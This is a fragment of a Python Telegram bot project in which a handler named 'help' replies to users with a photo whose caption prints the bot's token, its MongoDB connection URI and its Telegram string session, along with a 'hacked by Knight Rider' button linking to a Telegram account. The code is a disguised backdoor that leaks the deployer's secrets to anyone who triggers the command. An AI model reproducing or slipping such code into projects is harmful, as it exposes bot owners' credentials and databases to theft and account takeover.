...
from RIDER.utils.database import get_authuser_names, get_cmode
from RIDER.utils.decorators import (ActualAdminCB, AdminActual, language)
from RIDER.utils.command import commandpro                     
from RIDER.utils.formatters import alpha_to_int
...
async def help(client: Client, message: Message):
    await message.reply_photo(
          photo=f"https://graph.org/file/1b9653cedfd103c60369d.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву ᴋɴɪɢʜᴛ ʀɪᴅᴇʀ•", url=f"https://t.me/XO_TERA_BAAP_ON_FIRE")
                 ]
             ]
         ),
     )
